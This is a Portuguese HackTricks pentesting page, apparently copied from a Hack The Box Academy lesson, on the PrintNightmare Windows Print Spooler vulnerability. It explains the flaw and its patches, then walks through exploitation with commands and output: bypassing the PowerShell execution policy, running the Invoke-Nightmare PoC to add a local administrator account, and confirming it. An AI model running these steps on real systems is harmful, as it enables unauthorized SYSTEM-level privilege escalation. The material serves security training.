# PrintNightmare

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Esta página foi copiada de** [**https://academy.hackthebox.com/module/67/section/627**](https://academy.hackthebox.com/module/67/section/627)****

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` é uma falha em [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) que é usada para permitir a impressão remota e instalação de drivers. \
Esta função destina-se a dar aos **usuários com o privilégio do Windows `SeLoadDriverPrivilege`** a capacidade de **adicionar drivers** a um Spooler de Impressão remoto. Esse direito é normalmente reservado para usuários no grupo Administradores integrados e Operadores de Impressão que podem ter uma necessidade legítima de instalar um driver de impressora em uma máquina de usuário final remotamente.

A falha permitiu que **qualquer usuário autenticado adicionasse um driver de impressão** a um sistema Windows sem ter o privilégio mencionado acima, permitindo que um invasor execute **código remoto como SYSTEM** em qualquer sistema afetado. A falha **afeta todas as versões suportadas do Windows**, e sendo que o **Spooler de Impressão** é executado por padrão em **Controladores de Domínio**, Windows 7 e 10, e muitas vezes é habilitado em servidores Windows, isso apresenta uma enorme superfície de ataque, daí o "pesadelo".

Inicialmente, a Microsoft lançou um patch que não corrigiu o problema (e a orientação inicial era desativar o serviço Spooler, o que não é prático para muitas organizações), mas lançou um segundo [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) em julho de 2021, juntamente com orientações para verificar se as configurações específicas do registro estão definidas como `0` ou não definidas.&#x20;

Assim que essa vulnerabilidade foi tornada pública, exploits PoC foram lançados rapidamente. **** [**Esta**](https://github.com/cube0x0/CVE-2021-1675) **versão** por [@cube0x0](https://twitter.com/cube0x0) pode ser usada para **executar um DLL malicioso** remotamente ou localmente usando uma versão modificada do Impacket. O repositório também contém uma **implementação em C#**.\
Este **** [**script PowerShell**](https://github.com/calebstewart/CVE-2021-1675) **** pode ser usado para rápida escalada de privilégios local. Por **padrão**, este script **adiciona um novo usuário admin local**, mas também podemos fornecer uma DLL personalizada para obter um shell reverso ou similar se adicionar um usuário admin local não estiver no escopo.

### **Verificando o Serviço Spooler**

Podemos verificar rapidamente se o serviço Spooler está em execução com o seguinte comando. Se ele não estiver em execução, receberemos um erro "caminho não existe".
```
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```
### **Adicionando Administrador Local com PrintNightmare PowerShell PoC**

Comece por [burlar](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) a política de execução no host de destino:
```
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```
Agora podemos importar o script do PowerShell e usá-lo para adicionar um novo usuário administrador local.
```powershell
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```
### **Confirmando Novo Usuário Administrador**

Se tudo correu conforme o planejado, teremos um novo usuário administrador local sob nosso controle. Adicionar um usuário é "barulhento", não gostaríamos de fazer isso em um engajamento onde o sigilo é uma consideração. Além disso, gostaríamos de verificar com nosso cliente se a criação de contas está dentro do escopo da avaliação.
```
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
